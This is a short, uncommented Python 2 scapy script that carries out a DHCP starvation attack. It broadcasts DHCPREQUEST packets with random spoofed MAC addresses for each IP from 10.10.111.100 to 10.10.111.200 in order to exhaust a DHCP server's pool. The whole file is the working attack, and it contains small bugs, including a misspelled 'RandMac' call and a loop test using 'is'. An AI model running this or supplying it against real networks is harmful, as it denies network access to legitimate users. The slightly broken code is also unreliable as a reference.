#! /usr/bin/env python
import time
from scapy.all import *
mac_list= []
mac_list.append("02:1d:07:00:01:ec")
i = 100
while not (i is 201):
	address = "10.10.111."+str(i)
	mac_addr = RandMAC()
	while mac_addr in mac_list:
		mac_addr = RandMac()
	mac_list.append(mac_addr)
	dhcp_request= Ether(src=mac_addr,dst="ff:ff:ff:ff:ff:ff")
	dhcp_request/=IP(src="0.0.0.0",dst="255.255.255.255")
	dhcp_request/=UDP(sport=68,dport=67)
	dhcp_request/=BOOTP(chaddr=mac_addr,xid=RandInt())
	dhcp_request/=DHCP(options=[("message-type","request"),("requested_addr",address),("server_id","10.10.111.1"),("lease_time",86400),"end"])
	sendp(dhcp_request)
	print "sending DHCPREQUEST FOR IP 10.10.111." + str(i)
	i = i + 1
	time.sleep(1)
